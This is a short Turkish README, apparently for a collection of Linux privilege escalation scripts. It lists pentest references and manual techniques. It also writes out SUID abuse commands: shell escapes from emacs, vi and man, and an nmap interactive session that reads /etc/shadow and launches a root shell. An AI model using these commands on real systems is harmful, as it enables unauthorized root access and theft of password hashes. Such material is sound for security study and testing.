# Linux Yetki Yükseltme (Privilege Escalation)

Sağda solda denk geldiğim ve yetki yükseltme için işe yarayabilecek scriptler. Linux ve unix sistemler için konfigürasyon eksikliklerine ve yetki yükseltmeye sebep olabilecek zafiyetlere bakıyorlar.

tools klasörünün altında README dosyaları ile beraber bulunmakta.

## Bakılabilecek kaynaklar
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- http://netsec.ws/?p=309
- https://n0where.net/linux-post-exploitation/
- https://highon.coffee/blog/linux-commands-cheat-sheet/
- http://www.rebootuser.com/?p=1623
- http://pentestmonkey.net/tools/audit/unix-privesc-check


## Manuel kontrol

- Shell Escape Sequences
- IFS Exploit
- LD_PRELOAD Exploit
- Symlinks

bkz -> http://www.dankalia.com/tutor/01005/0100501004.htm

## SUID bit 

````
- emacs - by entering alt+!
- vi - by entering :![commandname]
- man - by entering![command name] replacing [command name] with the program you wish to run.
````

````
nmap --interactive
> !whoami              # root
> !cat /etc/shadow     # SUCCESS: prints out hashed passwords
> !bash                # SUCCESS: launches root shell
````
bkz -> https://gist.github.com/dergachev/7916152

